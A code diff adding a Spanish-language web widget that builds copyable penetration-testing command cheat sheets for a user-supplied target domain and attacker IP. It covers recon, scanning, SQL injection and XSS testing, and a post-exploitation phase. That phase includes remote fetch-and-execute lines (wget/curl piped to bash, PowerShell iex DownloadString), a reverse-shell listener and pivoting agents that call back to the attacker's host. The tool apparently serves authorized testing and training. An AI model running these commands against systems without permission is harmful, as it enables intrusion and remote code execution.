@@ -2700,4 +2700,184 @@ document.addEventListener('DOMContentLoaded', function() {
             }
         });
     })();
+    // =========================================================
+    // 27. Herramienta: OSINT Quick Recon
+    // =========================================================
+    (function() {
+        const tgtInput = document.getElementById('recon-target');
+        const ipInput = document.getElementById('recon-myip');
+        const pillsDiv = document.getElementById('phase-pills');
+        const outputDiv = document.getElementById('recon-output');
+        
+        if (!tgtInput || !ipInput || !pillsDiv || !outputDiv) return;
+
+        console.log("✅ OSINT Quick Recon cargado.");
+
+        const lang = window.LANG || 'es';
+        let activePhase = 'all';
+
+        const PHASES = [
+            {
+                id: 'passive',
+                label: lang === 'es' ? '🕵️ Pasivo (legal)' : '🕵️ Passive (legal)',
+                cmds: [
+                    {desc:'WHOIS', cmd:'whois {TARGET}'},
+                    {desc:'DNS — todos los registros', cmd:'dig {TARGET} ANY +noall +answer\ndig {TARGET} MX +short\ndig {TARGET} TXT +short\ndig {TARGET} NS +short'},
+                    {desc:'Certificados SSL (crt.sh)', cmd:"curl -s 'https://crt.sh/?q=%.{TARGET}&output=json' | jq '.[].name_value' | sort -u"},
+                    {desc:'Subdominios — Subfinder', cmd:'subfinder -d {TARGET} -o subdominios_{TARGET}.txt'},
+                    {desc:'Subdominios — Amass pasivo', cmd:'amass enum -passive -d {TARGET} -o amass_{TARGET}.txt'},
+                    {desc:'Subdominios — Assetfinder', cmd:'assetfinder --subs-only {TARGET} | sort -u'},
+                    {desc:'Subdominios vivos (httpx)', cmd:'cat subdominios_{TARGET}.txt | httpx -silent -status-code -title -tech-detect -o vivos_{TARGET}.txt'},
+                    {desc:'Google Dorks — documentos', cmd:"# Abrir en navegador:\n# site:{TARGET} filetype:pdf OR filetype:docx OR filetype:xlsx\n# site:{TARGET} inurl:admin OR inurl:login\n# site:{TARGET} filetype:env OR filetype:config"},
+                    {desc:'TheHarvester — emails/IPs', cmd:'theHarvester -d {TARGET} -b google,bing,duckduckgo,crtsh,linkedin -f theharvester_{TARGET}'},
+                    {desc:'Shodan (CLI)', cmd:"shodan search 'hostname:{TARGET}' --fields ip_str,port,org,product\nshodan search 'ssl.cert.subject.cn:{TARGET}' --fields ip_str,port"},
+                    {desc:'Wayback Machine URLs', cmd:"curl -s 'http://web.archive.org/cdx/search/cdx?url=*.{TARGET}&output=text&fl=original&collapse=urlkey' | sort -u"},
+                    {desc:'GitHub — credenciales expuestas', cmd:"# Buscar en: https://github.com/search?q={TARGET}+password&type=code\n# O con gitleaks en repos clonados:\n# gitleaks detect --source /ruta/repo/"},
+                    {desc:'ASN y rangos de red', cmd:'whois -h whois.radb.net -- \'-i origin $(whois {TARGET} | grep origin | head -1 | awk "{print \\$2}")\' | grep route'},
+                    {desc:'Emails (Hunter.io CLI)', cmd:"curl -s 'https://api.hunter.io/v2/domain-search?domain={TARGET}&api_key=TU_API_KEY' | jq '.data.emails[].value'"},
+                ]
+            },
+            {
+                id: 'active',
+                label: lang === 'es' ? '⚡ Activo (requiere permiso)' : '⚡ Active (requires permission)',
+                cmds: [
+                    {desc:'Nmap — puertos rápidos', cmd:'nmap -sV -sC -T4 -oA nmap_quick_{TARGET} {TARGET}'},
+                    {desc:'Nmap — todos los puertos', cmd:'nmap -p- --min-rate 5000 -T4 -oA nmap_full_{TARGET} {TARGET}'},
+                    {desc:'Nmap — vulnerabilidades', cmd:'nmap -sV --script vuln -oA nmap_vuln_{TARGET} {TARGET}'},
+                    {desc:'Nmap — UDP top 100', cmd:'sudo nmap -sU --top-ports 100 -T4 -oA nmap_udp_{TARGET} {TARGET}'},
+                    {desc:'Directorios — Gobuster', cmd:'gobuster dir -u https://{TARGET} -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,bak -t 50 -o gobuster_{TARGET}.txt'},
+                    {desc:'Directorios — ffuf', cmd:'ffuf -u https://{TARGET}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,201,301,302 -o ffuf_{TARGET}.json'},
+                    {desc:'Subdominios — ffuf VHost', cmd:'ffuf -u https://{TARGET} -H "Host: FUZZ.{TARGET}" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0'},
+                    {desc:'Nikto — web scanner', cmd:'nikto -h https://{TARGET} -o nikto_{TARGET}.txt'},
+                    {desc:'WhatWeb — tecnologías', cmd:'whatweb -v https://{TARGET}'},
+                    {desc:'SSLyze — análisis TLS', cmd:'sslyze {TARGET}:443 --certinfo --robot --heartbleed'},
+                    {desc:'testssl.sh', cmd:'./testssl.sh --quiet --color 0 {TARGET}:443 | tee testssl_{TARGET}.txt'},
+                    {desc:'Nuclei — templates básicos', cmd:'nuclei -u https://{TARGET} -t /root/nuclei-templates/ -severity critical,high -o nuclei_{TARGET}.txt'},
+                ]
+            },
+            {
+                id: 'web',
+                label: lang === 'es' ? '🌐 Web pentesting' : '🌐 Web pentesting',
+                cmds: [
+                    {desc:'Tecnologías del stack', cmd:'curl -sI https://{TARGET} | grep -iE "server|x-powered|content-type|cf-ray|x-generator"'},
+                    {desc:'Robots y sitemap', cmd:'curl -s https://{TARGET}/robots.txt\ncurl -s https://{TARGET}/sitemap.xml'},
+                    {desc:'Archivos sensibles típicos', cmd:'for f in .env config.php wp-config.php .git/config .htaccess backup.zip db.sql; do\n  code=$(curl -s -o /dev/null -w "%{http_code}" https://{TARGET}/$f)\n  echo "$code $f"\ndone'},
+                    {desc:'Parámetros ocultos (Arjun)', cmd:'arjun -u https://{TARGET}/index.php -m GET'},
+                    {desc:'SQLMap sobre URL', cmd:'sqlmap -u "https://{TARGET}/page?id=1" --dbs --batch --level=3'},
+                    {desc:'XSS con dalfox', cmd:'echo "https://{TARGET}/search?q=FUZZ" | dalfox pipe'},
+                    {desc:'Capture JS endpoints', cmd:"curl -s https://{TARGET} | grep -oP 'src=[\"'\\''](https?://[^\"'\\'']+)' | sort -u"},
+                    {desc:'WAF detection (wafw00f)', cmd:'wafw00f https://{TARGET}'},
+                ]
+            },
+            {
+                id: 'network',
+                label: lang === 'es' ? '🔌 Red / Infra' : '🔌 Network / Infra',
+                cmds: [
+                    {desc:'Traceroute', cmd:'traceroute {TARGET}\nmtr --report {TARGET}'},
+                    {desc:'Ping sweep de la subred', cmd:'nmap -sn 192.168.1.0/24 -oG - | grep Up | awk \'{print $2}\''},
+                    {desc:'SMB enum (smbclient)', cmd:'smbclient -L //{TARGET} -N\nenum4linux-ng -A {TARGET}'},
+                    {desc:'SMTP enum', cmd:'smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {TARGET}'},
+                    {desc:'SNMP enum', cmd:'snmpwalk -v2c -c public {TARGET}\nsnmp-check {TARGET}'},
+                    {desc:'RDP check', cmd:'nmap -p 3389 --script rdp-enum-encryption {TARGET}'},
+                    {desc:'FTP anonymous login', cmd:'curl -v ftp://{TARGET}/ --user anonymous:anonymous'},
+                    {desc:'Banner grabbing', cmd:'nc -nv {TARGET} 21\nnc -nv {TARGET} 22\nnc -nv {TARGET} 25\nnc -nv {TARGET} 80'},
+                ]
+            },
+            {
+                id: 'postexpl',
+                label: lang === 'es' ? '💀 Post-explotación' : '💀 Post-exploitation',
+                cmds: [
+                    {desc:'Exfiltración HTTP (servidor)', cmd:'# En {MYIP}:\npython3 -m http.server 8000\n\n# En víctima:\nwget http://{MYIP}:8000/tools/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh'},
+                    {desc:'Shell reversa NetCat listener', cmd:'rlwrap nc -lvnp 4444'},
+                    {desc:'Upgradear shell a TTY', cmd:"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm SHELL=bash"},
+                    {desc:'LinPEAS (transfer + run)', cmd:'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash'},
+                    {desc:'WinPEAS (PowerShell)', cmd:'iex (New-Object Net.WebClient).DownloadString("http://{MYIP}:8000/winPEAS.ps1")'},
+                    {desc:'Pivoting — Chisel (servidor)', cmd:'./chisel server -p 8888 --reverse'},
+                    {desc:'Pivoting — Chisel (cliente)', cmd:'./chisel client {MYIP}:8888 R:1080:socks'},
+                    {desc:'Pivoting — Ligolo', cmd:'# Atacante:\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\nsudo ./proxy -selfcert\n\n# Víctima:\n./agent -connect {MYIP}:11601 -ignore-cert'},
+                ]
+            }
+        ];
+
+        function escapeHTML(s) {
+            const d = document.createElement('div');
+            d.textContent = String(s || '');
+            return d.innerHTML;
+        }
+
+        function renderPills() {
+            let html = `<button data-phase="all" class="recon-pill ${activePhase === 'all' ? 'active' : ''}">${lang === 'es' ? 'Todas las fases' : 'All phases'}</button>`;
+            PHASES.forEach(p => {
+                html += `<button data-phase="${p.id}" class="recon-pill ${activePhase === p.id ? 'active' : ''}">${escapeHTML(p.label)}</button>`;
+            });
+            pillsDiv.innerHTML = html;
+
+            pillsDiv.querySelectorAll('.recon-pill').forEach(btn => {
+                btn.addEventListener('click', (e) => {
+                    activePhase = e.target.getAttribute('data-phase');
+                    renderPills();
+                    renderAll();
+                });
+            });
+        }
+
+        function renderAll() {
+            const target = tgtInput.value.trim() || 'TARGET';
+            const myip = ipInput.value.trim() || '10.10.14.5';
+            let html = '';
+
+            PHASES.forEach(phase => {
+                if (activePhase !== 'all' && activePhase !== phase.id) return;
+                
+                html += `
+                <div class="recon-phase-section">
+                    <div class="recon-phase-title">${escapeHTML(phase.label)}</div>`;
+                
+                phase.cmds.forEach(item => {
+                    const cmd = item.cmd.replace(/\{TARGET\}/g, target).replace(/\{MYIP\}/g, myip);
+                    html += `
+                    <div class="recon-cmd-item">
+                        <div class="recon-cmd-desc">${escapeHTML(item.desc)}</div>
+                        <div class="recon-cmd-wrap">
+                            <pre class="recon-cmd-pre">${escapeHTML(cmd)}</pre>
+                            <button class="recon-copy-btn" data-cmd="${escapeHTML(cmd)}">📋</button>
+                        </div>
+                    </div>`;
+                });
+                html += `</div>`;
+            });
+
+            if (!html) {
+                html = `<p style="font-family:var(--mono);font-size:.85rem;color:var(--gray);">${lang === 'es' ? 'Introduce un dominio para generar los comandos.' : 'Enter a domain to generate commands.'}</p>`;
+            }
+            outputDiv.innerHTML = html;
+
+            // Lógica de copia limpia y segura (sin onlick en línea)
+            outputDiv.querySelectorAll('.recon-copy-btn').forEach(btn => {
+                btn.addEventListener('click', (e) => {
+                    const t = e.target.getAttribute('data-cmd');
+                    if (navigator.clipboard) {
+                        navigator.clipboard.writeText(t);
+                    } else {
+                        const el = document.createElement('textarea');
+                        el.value = t;
+                        document.body.appendChild(el);
+                        el.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(el);
+                    }
+                    // Feedback visual
+                    const oldText = e.target.textContent;
+                    e.target.textContent = '✅';
+                    setTimeout(() => { e.target.textContent = oldText; }, 1500);
+                });
+            });
+        }
+
+        tgtInput.addEventListener('input', renderAll);
+        ipInput.addEventListener('input', renderAll);
+
+        renderPills();
+        renderAll();
+    })();
 });
